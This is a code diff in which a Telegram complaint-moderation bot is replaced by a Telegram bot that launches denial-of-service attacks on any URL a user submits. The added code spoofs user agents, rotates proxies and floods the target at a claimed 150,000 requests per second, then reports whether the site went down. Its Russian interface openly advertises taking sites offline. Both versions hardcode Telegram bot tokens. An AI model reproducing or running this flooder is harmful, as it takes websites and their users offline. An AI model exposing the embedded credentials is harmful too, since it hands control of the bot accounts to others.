@@ -1,413 +1,434 @@
 import asyncio
+import aiohttp
+import time
+import random
 import logging
-from datetime import datetime
-from typing import Dict, List, Optional
-from uuid import uuid4
-from aiohttp import web
-from aiogram import Bot, Dispatcher, F, Router
-from aiogram.filters import CommandStart
-from aiogram.fsm.context import FSMContext
-from aiogram.fsm.state import State, StatesGroup
-from aiogram.types import (
-    CallbackQuery,
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-    Message,
-)
-from aiogram.utils.keyboard import InlineKeyboardBuilder
-import os
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import Command
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.client.default import DefaultBotProperties
+from aiogram.enums import ParseMode
 
-# Настройка логирования
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+# Настройки
+API_TOKEN = '7932161824:AAEhYsRourQLwHhTqnUJPCdQ-vwGUF1BA6s'  # ЗАМЕНИ НА СВОЙ ТОКЕН
 
-# Токен бота
-BOT_TOKEN = "8244351005:AAF9y3P7CK9lT2hIXFDlGaDg8BY1Dh2FBXs"
-
-# Инициализация бота и диспетчера
-bot = Bot(token=BOT_TOKEN)
+# Инициализация бота
+bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
-router = Router()
-dp.include_router(router)
 
-# Список типов жалоб
-COMPLAINT_TYPES = [
-    "Жестокое обращение с детьми",
-    "Насилие",
-    "Незаконные товары",
-    "за сролинг",
-    "Порнографические материалы",
-    "Персональные данные",
-    "Терроризм",
-    "Мошенничество или спам",
-    "Нарушение авторских прав",
-    "Другое",
-    "Не нарушает закон, но надо удалить"
-]
+# Глобальные переменные
+active_attacks = {}
 
-# Класс для хранения состояний FSM
-class ComplaintStates(StatesGroup):
-    wait_for_link = State()
-    wait_for_type = State()
-    wait_for_confirmation = State()
-
-# Структуры для хранения данных
-class Moderator:
-    def __init__(self, user_id: int, username: str, rating: float = 5.0, total_reviews: int = 0):
-        self.user_id = user_id
-        self.username = username
-        self.rating = rating
-        self.total_reviews = total_reviews
-
-class Complaint:
-    def __init__(self, complaint_id: str, user_id: int, username: str, link: str, complaint_type: str):
-        self.complaint_id = complaint_id
-        self.user_id = user_id
-        self.username = username
-        self.link = link
-        self.complaint_type = complaint_type
-        self.status = "pending"  # pending, in_progress, approved, rejected
-        self.moderator_id = None
-        self.created_at = datetime.now()
-
-# Хранилище данных в памяти
-complaints_db: Dict[str, Complaint] = {}
-moderators_db: Dict[int, Moderator] = {}
-user_complaints: Dict[int, str] = {}  # user_id -> complaint_id
-
-# Инициализация тестовых модераторов
-def initialize_moderators():
-    moderators_data = [
-        (7246667404, "IovesusIika"),
-        (1610843750, "vkdistopia"),
-        (8423284962, "splicer33"),
+# ==================== ГЕНЕРАЦИЯ ЮЗЕРАГЕНТОВ ====================
+def generate_user_agents(count=2000):
+    """Генерирует реалистичные юзерагенты"""
+    
+    windows_versions = ["10.0", "11.0", "6.1", "6.2", "6.3", "10.0; Win64; x64", "11.0; Win64; x64"]
+    mac_versions = ["14_3", "14_2", "14_1", "14_0", "13_6", "13_5", "13_4", "13_3"]
+    linux_distros = ["Linux x86_64", "X11; Linux x86_64", "X11; Ubuntu; Linux x86_64"]
+    
+    chrome_versions = [
+        (120, 0, 6099, 210), (119, 0, 6045, 200), (118, 0, 5993, 120),
+        (117, 0, 5938, 92), (116, 0, 5845, 190)
     ]
     
-    for user_id, username in moderators_data:
-        moderators_db[user_id] = Moderator(user_id, username)
-
-# Клавиатуры
-def get_main_keyboard():
-    keyboard = InlineKeyboardBuilder()
-    keyboard.add(
-        InlineKeyboardButton(text="👻 Список модераторов", callback_data="moderators_list"),
-        InlineKeyboardButton(text="🔵 Подать жалобу", callback_data="file_complaint")
-    )
-    return keyboard.as_markup()
-
-def get_complaint_types_keyboard():
-    keyboard = InlineKeyboardBuilder()
-    for i, complaint_type in enumerate(COMPLAINT_TYPES):
-        keyboard.add(InlineKeyboardButton(
-            text=complaint_type, 
-            callback_data=f"complaint_type_{i}"
-        ))
-    keyboard.adjust(1)
-    return keyboard.as_markup()
-
-def get_confirmation_keyboard():
-    keyboard = InlineKeyboardBuilder()
-    keyboard.add(
-        InlineKeyboardButton(text="👻 Отправить", callback_data="confirm_complaint"),
-        InlineKeyboardButton(text="🔵 Отменить", callback_data="cancel_complaint")
-    )
-    return keyboard.as_markup()
-
-def get_moderation_keyboard(complaint_id: str):
-    keyboard = InlineKeyboardBuilder()
-    keyboard.add(
-        InlineKeyboardButton(text="👻 Принять в обработку", callback_data=f"accept_{complaint_id}"),
-        InlineKeyboardButton(text="🔵 Отказать", callback_data=f"reject_{complaint_id}")
-    )
-    return keyboard.as_markup()
-
-def get_rating_keyboard(complaint_id: str, moderator_id: int):
-    keyboard = InlineKeyboardBuilder()
-    for rating in [5, 4, 3, 2, 1]:
-        keyboard.add(InlineKeyboardButton(
-            text=str(rating), 
-            callback_data=f"rate_{complaint_id}_{moderator_id}_{rating}"
-        ))
-    return keyboard.as_markup()
-
-# Простой HTTP сервер для проверки здоровья
-async def health_check(request):
-    return web.json_response({
-        "status": "ok", 
-        "service": "Telegram Complaint Bot",
-        "timestamp": datetime.now().isoformat(),
-        "complaints_count": len(complaints_db),
-        "moderators_count": len(moderators_db)
-    })
-
-async def start_http_server(port=8000):
-    """Запуск HTTP сервера для проверки порта"""
-    app = web.Application()
-    app.router.add_get('/health', health_check)
-    app.router.add_get('/', health_check)
+    firefox_versions = [(121, 0), (120, 0), (119, 0), (118, 0), (117, 0)]
+    safari_versions = [(17, 2), (17, 1), (17, 0), (16, 6), (16, 5)]
     
-    runner = web.AppRunner(app)
-    await runner.setup()
+    mobile_devices = [
+        ("iPhone", "CPU iPhone OS 17_2 like Mac OS X"),
+        ("iPhone", "CPU iPhone OS 17_1 like Mac OS X"), 
+        ("Linux; Android 14", "SM-S918B"),
+        ("Linux; Android 14", "Pixel 8 Pro"),
+        ("Linux; Android 13", "SM-S901B"),
+    ]
     
-    site = web.TCPSite(runner, '0.0.0.0', port)
-    await site.start()
+    user_agents = []
     
-    logger.info(f"👻 HTTP сервер запущен на порту {port}")
-    return runner
-
-# Обработчики команд
-@router.message(CommandStart())
-async def cmd_start(message: Message):
-    welcome_text = (
-        "👻 Привет, тут ты можешь подать жалобу на контент нарушающий правила TOS. "
-        "🔵 Выбирай кнопку ниже"
-    )
-    await message.answer(welcome_text, reply_markup=get_main_keyboard())
-
-# Обработчики callback'ов
-@router.callback_query(F.data == "moderators_list")
-async def show_moderators(callback: CallbackQuery):
-    if not moderators_db:
-        await callback.answer("👻 Список модераторов пуст")
-        return
+    # Chrome
+    for _ in range(count // 3):
+        chrome_ver = random.choice(chrome_versions)
+        chrome_str = f"{chrome_ver[0]}.{chrome_ver[1]}.{chrome_ver[2]}.{chrome_ver[3]}"
+        
+        user_agents.append(
+            f"Mozilla/5.0 (Windows NT {random.choice(windows_versions)}) "
+            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_str} Safari/537.36"
+        )
+        
+        user_agents.append(
+            f"Mozilla/5.0 (Macintosh; Intel Mac OS X {random.choice(mac_versions)}) "
+            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_str} Safari/537.36"
+        )
     
-    moderators_text = "👻 Список модераторов:\n\n"
-    for moderator in moderators_db.values():
-        moderators_text += f"🔵 @{moderator.username} | ID: {moderator.user_id} | Рейтинг: {moderator.rating:.1f}⭐\n"
+    # Firefox
+    for _ in range(count // 4):
+        firefox_ver = random.choice(firefox_versions)
+        firefox_str = f"{firefox_ver[0]}.{firefox_ver[1]}"
+        
+        user_agents.append(
+            f"Mozilla/5.0 (Windows NT {random.choice(windows_versions)}; rv:{firefox_str}) "
+            f"Gecko/20100101 Firefox/{firefox_str}"
+        )
     
-    await callback.message.edit_text(moderators_text)
-    await callback.answer()
-
-@router.callback_query(F.data == "file_complaint")
-async def start_complaint(callback: CallbackQuery, state: FSMContext):
-    await state.set_state(ComplaintStates.wait_for_link)
-    await callback.message.edit_text(
-        "👻 Пожалуйста, отправьте ссылку на нарушение (канал/бот/пользователь):"
-    )
-    await callback.answer()
-
-@router.message(ComplaintStates.wait_for_link)
-async def process_link(message: Message, state: FSMContext):
-    link = message.text.strip()
+    # Safari
+    for _ in range(count // 6):
+        safari_ver = random.choice(safari_versions)
+        safari_str = f"{safari_ver[0]}.{safari_ver[1]}"
+        
+        user_agents.append(
+            f"Mozilla/5.0 (Macintosh; Intel Mac OS X {random.choice(mac_versions)}) "
+            f"AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_str} Safari/605.1.15"
+        )
     
-    # Простая валидация ссылки
-    if not (link.startswith('http') or link.startswith('t.me')):
-        await message.answer("👻 Пожалуйста, веди норм ссылку. Пример: https://t.me/. Ток публчичные чаты плс")
-        return
-    
-    await state.update_data(link=link)
-    await state.set_state(ComplaintStates.wait_for_type)
-    
-    await message.answer(
-        "🔵 Выберите тип нарушения:",
-        reply_markup=get_complaint_types_keyboard()
-    )
-
-@router.callback_query(F.data.startswith("complaint_type_"))
-async def process_complaint_type(callback: CallbackQuery, state: FSMContext):
-    type_index = int(callback.data.split("_")[2])
-    complaint_type = COMPLAINT_TYPES[type_index]
-    
-    await state.update_data(complaint_type=complaint_type)
-    await state.set_state(ComplaintStates.wait_for_confirmation)
-    
-    data = await state.get_data()
-    
-    confirmation_text = (
-        "👻 Пожалуйста, подтвердите вашу жалобу:\n\n"
-        f"🔵 Ссылка: {data['link']}\n"
-        f"🔵 Тип нарушения: {complaint_type}\n\n"
-        "👻 Всё верно?"
-    )
-    
-    await callback.message.edit_text(confirmation_text, reply_markup=get_confirmation_keyboard())
-    await callback.answer()
-
-@router.callback_query(F.data == "confirm_complaint")
-async def confirm_complaint(callback: CallbackQuery, state: FSMContext):
-    data = await state.get_data()
-    
-    # Создаем жалобу
-    complaint_id = str(uuid4())[:8]
-    complaint = Complaint(
-        complaint_id=complaint_id,
-        user_id=callback.from_user.id,
-        username=callback.from_user.username or f"User_{callback.from_user.id}",
-        link=data['link'],
-        complaint_type=data['complaint_type']
-    )
-    
-    complaints_db[complaint_id] = complaint
-    user_complaints[callback.from_user.id] = complaint_id
-    
-    # Отправляем уведомление модераторам
-    await notify_moderators(complaint)
-    
-    await callback.message.edit_text(
-        "👻 Ваша жалоба отправлена модераторам. Ожидайте рассмотрения."
-    )
-    await state.clear()
-    await callback.answer()
-
-@router.callback_query(F.data == "cancel_complaint")
-async def cancel_complaint(callback: CallbackQuery, state: FSMContext):
-    await callback.message.edit_text("👻 Жалоба отменена.")
-    await state.clear()
-    await callback.answer()
-
-# Уведомление модераторов
-async def notify_moderators(complaint: Complaint):
-    complaint_text = (
-        "👻 Новая жалоба!\n\n"
-        f"🔵 Пользователь: @{complaint.username}\n"
-        f"🔵 ID: {complaint.user_id}\n"
-        f"🔵 Ссылка: {complaint.link}\n"
-        f"🔵 Тип нарушения: {complaint.complaint_type}\n"
-        f"🔵 ID жалобы: {complaint.complaint_id}"
-    )
-    
-    for moderator in moderators_db.values():
-        try:
-            await bot.send_message(
-                moderator.user_id,
-                complaint_text,
-                reply_markup=get_moderation_keyboard(complaint.complaint_id)
+    # Mobile
+    for _ in range(count // 5):
+        device, os = random.choice(mobile_devices)
+        
+        if "iPhone" in device:
+            user_agents.append(
+                f"Mozilla/5.0 ({device}; {os}) "
+                f"AppleWebKit/605.1.15 (KHTML, like Gecko) "
+                f"Version/17.2 Mobile/15E148 Safari/604.1"
             )
-        except Exception as e:
-            logger.error(f"👻 Не удалось отправить уведомление модератору {moderator.user_id}: {e}")
+        else:
+            chrome_ver = random.choice(chrome_versions)
+            chrome_str = f"{chrome_ver[0]}.{chrome_ver[1]}.{chrome_ver[2]}.{chrome_ver[3]}"
+            
+            user_agents.append(
+                f"Mozilla/5.0 ({os}; {device}) "
+                f"AppleWebKit/537.36 (KHTML, like Gecko) "
+                f"Chrome/{chrome_str} Mobile Safari/537.36"
+            )
+    
+    unique_agents = list(set(user_agents))
+    random.shuffle(unique_agents)
+    return unique_agents[:count]
 
-# Обработка действий модератора
-@router.callback_query(F.data.startswith("accept_"))
-async def accept_complaint(callback: CallbackQuery):
-    complaint_id = callback.data.split("_")[1]
-    
-    if complaint_id not in complaints_db:
-        await callback.answer("👻 Жалоба не найдена")
-        return
-    
-    complaint = complaints_db[complaint_id]
-    
-    # Проверяем, что модератор есть в списке
-    if callback.from_user.id not in moderators_db:
-        await callback.answer("👻 У вас нет прав модератора")
-        return
-    
-    # Проверяем, не взята ли уже жалоба другим модератором
-    if complaint.status != "pending":
-        await callback.answer("👻 Эта жалоба уже обрабатывается другим модератором")
-        return
-    
-    # Обновляем статус жалобы
-    complaint.status = "in_progress"
-    complaint.moderator_id = callback.from_user.id
-    moderator = moderators_db[callback.from_user.id]
-    
-    # Уведомляем пользователя
+USER_AGENTS = generate_user_agents(2000)
+
+# ==================== ЗАГРУЗКА ПРОКСИ ====================
+def load_proxies():
+    """Загружает прокси из файла или генерирует тестовые"""
     try:
-        await bot.send_message(
-            complaint.user_id,
-            f"👻 Вашу жалобу принял модератор @{moderator.username}. Оставьте рейтинг:",
-            reply_markup=get_rating_keyboard(complaint_id, moderator.user_id)
-        )
-    except Exception as e:
-        logger.error(f"👻 Не удалось уведомить пользователя {complaint.user_id}: {e}")
+        with open('proxies.txt', 'r', encoding='utf-8') as f:
+            proxies = []
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    if line.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
+                        proxies.append(line)
+                    elif ':' in line and '@' in line:
+                        proxies.append(f"http://{line}")
+                    elif ':' in line:
+                        proxies.append(f"http://{line}")
+            return proxies
+    except FileNotFoundError:
+        print("⚠️ Файл proxies.txt не найден, используем тестовые прокси")
+        # Генерация тестовых прокси
+        test_proxies = []
+        for i in range(100):
+            ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+            port = random.choice([8080, 3128, 1080, 8888])
+            test_proxies.append(f"http://{ip}:{port}")
+        return test_proxies
+
+PROXY_LIST = load_proxies()
+
+# ==================== МЕНЕДЖЕР АТАК ====================
+class AdvancedAttackManager:
+    def __init__(self):
+        self.user_agents = USER_AGENTS * 5  # Умножаем для разнообразия
+        self.proxies = PROXY_LIST * 3 if PROXY_LIST else [None]
+        
+    def get_random_headers(self):
+        return {
+            'User-Agent': random.choice(self.user_agents),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Cache-Control': 'no-cache'
+        }
     
-    # Обновляем сообщение у модератора
-    await callback.message.edit_text(
-        f"👻 Вы приняли жалобу {complaint_id} в обработку\n\n"
-        f"🔵 Ссылка: {complaint.link}\n"
-        f"🔵 Тип: {complaint.complaint_type}"
+    def get_random_proxy(self):
+        if not self.proxies or self.proxies == [None]:
+            return None
+        return random.choice(self.proxies)
+    
+    async def check_site_status(self, url):
+        """Проверяет статус сайта"""
+        try:
+            async with aiohttp.ClientSession() as session:
+                start_time = time.time()
+                async with session.get(url, timeout=10, ssl=False) as response:
+                    end_time = time.time()
+                    return {
+                        'status': 'online' if response.status == 200 else 'error',
+                        'response_time': end_time - start_time,
+                        'status_code': response.status
+                    }
+        except Exception as e:
+            return {'status': 'offline', 'error': str(e)}
+
+    async def run_distributed_attack(self, target_url, duration=30, target_rps=150000):
+        """Запускает распределенную атаку"""
+        success_count = 0
+        fail_count = 0
+        start_time = time.time()
+        
+        # Статус до атаки
+        initial_status = await self.check_site_status(target_url)
+        
+        # Параметры для 150K RPS
+        total_requests = target_rps * duration
+        concurrent_workers = min(1000, target_rps // 150)
+        
+        print(f"🚀 Starting attack: {target_rps} RPS, {duration} seconds")
+        
+        # Создаем connector
+        connector = aiohttp.TCPConnector(limit=concurrent_workers, limit_per_host=concurrent_workers)
+        
+        async with aiohttp.ClientSession(connector=connector) as session:
+            semaphore = asyncio.Semaphore(concurrent_workers)
+            
+            async def send_request(request_id):
+                async with semaphore:
+                    try:
+                        headers = self.get_random_headers()
+                        proxy = self.get_random_proxy()
+                        
+                        async with session.get(
+                            target_url,
+                            headers=headers,
+                            proxy=proxy,
+                            timeout=aiohttp.ClientTimeout(total=5),
+                            ssl=False
+                        ) as response:
+                            if response.status == 200:
+                                return True
+                            return False
+                    except Exception:
+                        return False
+            
+            # Запускаем атаку
+            batch_size = 3000
+            completed = 0
+            
+            while time.time() - start_time < duration and completed < total_requests:
+                current_batch = min(batch_size, total_requests - completed)
+                
+                tasks = []
+                for i in range(current_batch):
+                    task = send_request(completed + i)
+                    tasks.append(task)
+                
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                
+                for result in results:
+                    if result is True:
+                        success_count += 1
+                    else:
+                        fail_count += 1
+                
+                completed += current_batch
+                
+                # Прогресс
+                progress = (completed / total_requests) * 100
+                if completed % (total_requests // 10) == 0:
+                    print(f"Progress: {progress:.1f}%")
+                
+                await asyncio.sleep(0.01)
+        
+        end_time = time.time()
+        attack_duration = end_time - start_time
+        
+        # Статус после атаки
+        final_status = await self.check_site_status(target_url)
+        
+        return {
+            'success_count': success_count,
+            'fail_count': fail_count,
+            'attack_duration': attack_duration,
+            'initial_status': initial_status,
+            'final_status': final_status,
+            'target_rps': target_rps,
+            'actual_rps': success_count / attack_duration if attack_duration > 0 else 0,
+            'total_requests': success_count + fail_count
+        }
+
+# Создаем менеджер атак
+attack_manager = AdvancedAttackManager()
+
+# ==================== КЛАВИАТУРЫ ====================
+def get_start_keyboard():
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="начать ддосить", callback_data="start_attack")],
+            [InlineKeyboardButton(text="статистика ресурсов пон", callback_data="stats")]
+        ]
+    )
+
+def get_cancel_keyboard():
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="отменить ддос", callback_data="cancel_attack")]
+        ]
+    )
+
+# ==================== ОБРАБОТЧИКИ ====================
+@dp.message(Command("start"))
+async def cmd_start(message: types.Message):
+    welcome_text = (
+        "👋 <b>Привет! Я могу помочь тебе положить какойто сайт</b>\n\n"
+        "⚡ <i>Возможности моей этой хуйни:</i>\n"
+        "• ддошу сайты на тысячи прокси серверов\n"
     )
     
+    await message.answer(welcome_text, reply_markup=get_start_keyboard())
+
+@dp.callback_query(F.data == "start_attack")
+async def ask_target_url(callback: types.CallbackQuery):
+    await callback.message.edit_text(
+        "🎯 <b>Введи сайт для ддос атаки:</b>\n\n"
+        "<i>Отправьте ссылку в чат</i>",
+        parse_mode=ParseMode.HTML
+    )
     await callback.answer()
 
-@router.callback_query(F.data.startswith("reject_"))
-async def reject_complaint(callback: CallbackQuery, state: FSMContext):
-    complaint_id = callback.data.split("_")[1]
-    
-    if complaint_id not in complaints_db:
-        await callback.answer("👻 Жалоба не найдена")
-        return
-    
-    complaint = complaints_db[complaint_id]
-    
-    # Проверяем права модератора
-    if callback.from_user.id not in moderators_db:
-        await callback.answer("👻 У вас нет прав модератора")
-        return
-    
-    # Помечаем жалобу как отклоненную
-    complaint.status = "rejected"
-    complaint.moderator_id = callback.from_user.id
-    
-    # Уведомляем пользователя
-    try:
-        await bot.send_message(
-            complaint.user_id,
-            f"👻 Ваша жалоба была отклонена модератором. "
-            f"🔵 Если у вас есть вопросы, обратитесь к администрации."
-        )
-    except Exception as e:
-        logger.error(f"👻 Не удалось уведомить пользователя {complaint.user_id}: {e}")
-    
-    await callback.message.edit_text(f"👻 Вы отклонили жалобу {complaint_id}")
+@dp.callback_query(F.data == "stats")
+async def show_stats(callback: types.CallbackQuery):
+    stats_text = (
+        f"📊 <b>Статистика бота:</b>\n\n"
+        f"👤 <b>Юзерагентов:</b> {len(USER_AGENTS):,}\n"
+        f"🔌 <b>Прокси:</b> {len(PROXY_LIST):,}\n"
+        f"⚡ <b>Макс. RPS:</b> 150,000\n"
+    )
+    await callback.message.edit_text(stats_text, reply_markup=get_start_keyboard())
     await callback.answer()
 
-# Обработка оценки модератора
-@router.callback_query(F.data.startswith("rate_"))
-async def rate_moderator(callback: CallbackQuery):
-    parts = callback.data.split("_")
-    complaint_id = parts[1]
-    moderator_id = int(parts[2])
-    rating = int(parts[3])
-    
-    if complaint_id not in complaints_db:
-        await callback.answer("👻 Жалоба не найдена")
-        return
-    
-    complaint = complaints_db[complaint_id]
-    
-    # Проверяем, что оценку ставит автор жалобы
-    if callback.from_user.id != complaint.user_id:
-        await callback.answer("👻 Вы не можете оценить эту жалобу")
-        return
-    
-    # Обновляем рейтинг модератора
-    if moderator_id in moderators_db:
-        moderator = moderators_db[moderator_id]
-        total_rating = moderator.rating * moderator.total_reviews
-        moderator.total_reviews += 1
-        moderator.rating = (total_rating + rating) / moderator.total_reviews
-        
-        # Помечаем жалобу как завершенную
-        complaint.status = "approved"
-        
-        await callback.message.edit_text(
-            f"👻 Спасибо за вашу оценку! Модератор @{moderator.username} теперь имеет рейтинг {moderator.rating:.1f}⭐"
-        )
+@dp.callback_query(F.data == "cancel_attack")
+async def cancel_attack(callback: types.CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id in active_attacks:
+        del active_attacks[user_id]
+        await callback.message.edit_text("🛑 <b>ддос отменон</b>", parse_mode=ParseMode.HTML)
     else:
-        await callback.answer("👻 Модератор не найден")
-        return
-    
+        await callback.answer("⚠️ ошибка: ты не начал ддос атаку для отмны")
     await callback.answer()
 
-# Запуск бота
-async def main():
-    # Инициализация модераторов
-    initialize_moderators()
+@dp.message(F.text.contains("http"))
+async def start_attack(message: types.Message):
+    target_url = message.text.strip()
+    user_id = message.from_user.id
     
-    # Запуск HTTP сервера
-    http_runner = await start_http_server()
+    # Проверяем валидность URL
+    if not target_url.startswith(('http://', 'https://')):
+        await message.answer("❌ <b>Неверный URL</b>\nИспользуйте формат: <code>https://example.com</code>")
+        return
     
+    # Проверяем нет ли уже активной атаки
+    if user_id in active_attacks:
+        await message.answer("⚠️ <b>У вас уже есть активная атака ддос</b>\nДождитесь завершения сейчасчишей атаки на сайтт")
+        return
+    
+    # Начинаем атаку
+    status_msg = await message.answer(
+        f"🎯 <b>Подготовка к ддосу</b>\n\n"
+        f"🌐 <b>Цель:</b> <code>{target_url}</code>\n"
+        f"⚡ <b>Интенсивность:</b> 150,000 RPS\n"
+        f"⏱ <b>Длительность:</b> 30-60 секунд\n"
+        f"👤 <b>Юзерагентов:</b> {len(USER_AGENTS):,}\n"
+        f"🔌 <b>Прокси:</b> {len(PROXY_LIST):,}\n\n"
+        f"<i>🔄 Инициализация...</i>",
+        parse_mode=ParseMode.HTML,
+        reply_markup=get_cancel_keyboard()
+    )
+    
+    # Запускаем атаку в фоне
+    active_attacks[user_id] = True
+    attack_task = asyncio.create_task(
+        execute_attack(user_id, target_url, status_msg)
+    )
+
+async def execute_attack(user_id: int, target_url: str, status_msg: types.Message):
+    """Выполняет атаку и отправляет результаты"""
     try:
-        logger.info("👻 Бот запущен")
-        await dp.start_polling(bot)
+        # Обновляем статус
+        await status_msg.edit_text(
+            f"🎯 <b>ддос атака запущена!</b>\n\n"
+            f"🌐 <b>Цель:</b> <code>{target_url}</code>\n"
+            f"⚡ <b>Интенсивность:</b> 150,000 RPS\n"
+            f"⏱ <b>Длительность:</b> 30-60 секунд\n\n"
+            f"<i>🚀 начинаю ддосить нахуй</i>",
+            parse_mode=ParseMode.HTML,
+            reply_markup=get_cancel_keyboard()
+        )
+        
+        # Запускаем атаку
+        results = await attack_manager.run_distributed_attack(
+            target_url=target_url,
+            duration=45,
+            target_rps=150000
+        )
+        
+        # Формируем отчет
+        success_rate = (results['success_count'] / results['total_requests']) * 100 if results['total_requests'] > 0 else 0
+        
+        # Определяем статус сайта
+        site_status = "✅ Онлайн" if results['final_status']['status'] == 'online' else "❌ Лежит"
+        
+        if results['final_status']['status'] == 'online' and results['initial_status']['status'] == 'online':
+            performance_change = "🟢 Стабильно"
+        elif results['final_status']['status'] == 'online' and results['initial_status']['status'] != 'online':
+            performance_change = "🟡 Восстановился"
+        else:
+            performance_change = "🔴 Упал"
+        
+        report_text = (
+            f"📊 <b>РЕЗУЛЬТАТЫ АТАКИ</b>\n\n"
+            f"🌐 <b>Сайт:</b> <code>{target_url}</code>\n"
+            f"⏱ <b>Время атаки:</b> {results['attack_duration']:.1f} сек\n"
+            f"🎯 <b>Целевой RPS:</b> {results['target_rps']:,}\n"
+            f"⚡ <b>Фактический RPS:</b> {results['actual_rps']:,.1f}\n\n"
+            f"📨 <b>Статистика запросов:</b>\n"
+            f"✅ <b>Успешных:</b> {results['success_count']:,}\n"
+            f"❌ <b>Не удалось:</b> {results['fail_count']:,}\n"
+            f"📈 <b>Процент успеха:</b> {success_rate:.1f}%\n\n"
+            f"🖥 <b>Статус сайта:</b> {site_status}\n"
+            f"📊 <b>Производительность:</b> {performance_change}\n\n"
+        )
+        
+        # Добавляем детали статуса
+        if results['final_status']['status'] == 'online':
+            report_text += f"⏱ <b>Время ответа:</b> {results['final_status'].get('response_time', 0):.2f} сек\n"
+            report_text += f"🔢 <b>Статус код:</b> {results['final_status'].get('status_code', 'N/A')}"
+        else:
+            report_text += f"💥 <b>Ошибка:</b> {results['final_status'].get('error', 'Unknown')}"
+        
+        await status_msg.edit_text(report_text, parse_mode=ParseMode.HTML)
+        
+    except asyncio.CancelledError:
+        await status_msg.edit_text("🛑 <b>Атака отменена пользователем</b>", parse_mode=ParseMode.HTML)
     except Exception as e:
-        logger.error(f"👻 Ошибка при запуске бота: {e}")
+        await status_msg.edit_text(
+            f"❌ <b>Ошибка при выполнении атаки:</b>\n\n<code>{str(e)}</code>",
+            parse_mode=ParseMode.HTML
+        )
     finally:
-        # Корректное завершение
-        await http_runner.cleanup()
-        await bot.session.close()
+        # Очищаем активную атаку
+        if user_id in active_attacks:
+            del active_attacks[user_id]
+
+# ==================== ЗАПУСК БОТА ====================
+async def main():
+    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+    
+    # Проверяем ресурсы
+    print(f"✅ Сгенерировано юзерагентов: {len(USER_AGENTS):,}")
+    print(f"✅ Загружено прокси: {len(PROXY_LIST):,}")
+    print("🚀 Бот готов к работе!")
+    
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
     asyncio.run(main())
